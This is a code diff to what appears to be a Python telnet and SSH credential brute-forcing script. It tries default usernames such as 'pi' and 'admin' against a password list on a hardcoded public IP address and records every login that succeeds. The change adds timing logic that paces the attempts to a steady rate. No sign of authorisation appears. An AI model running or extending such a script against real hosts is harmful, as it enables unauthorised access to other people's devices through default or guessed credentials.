@@ -4,6 +4,7 @@ import paramiko
 from paramiko import SSHException, BadHostKeyException, AuthenticationException
 from paramiko.ssh_exception import NoValidConnectionsError
 import time
+from datetime import datetime
 
 target_ip_address = ['157.82.207.245']
 id_list = ['pi', 'admin', 'user', 'usr', 'default']
@@ -60,9 +61,14 @@ def main():
         for id in id_list:
             for password in pass_list:
                 #print('trying telnet connect')
+                start_time = datetime.now()
                 if telnet_login(ip, id, password):
                     result.append(['telnet', ip, id, password])
-                time.sleep(cool_time)
+                end_time = datetime.now()
+                time_delta = (end_time - start_time).total_seconds()
+                #print(time_delta)
+                time.sleep(max(0, cool_time-time_delta))
+                #time.sleep(cool_time)
     return result
 
 
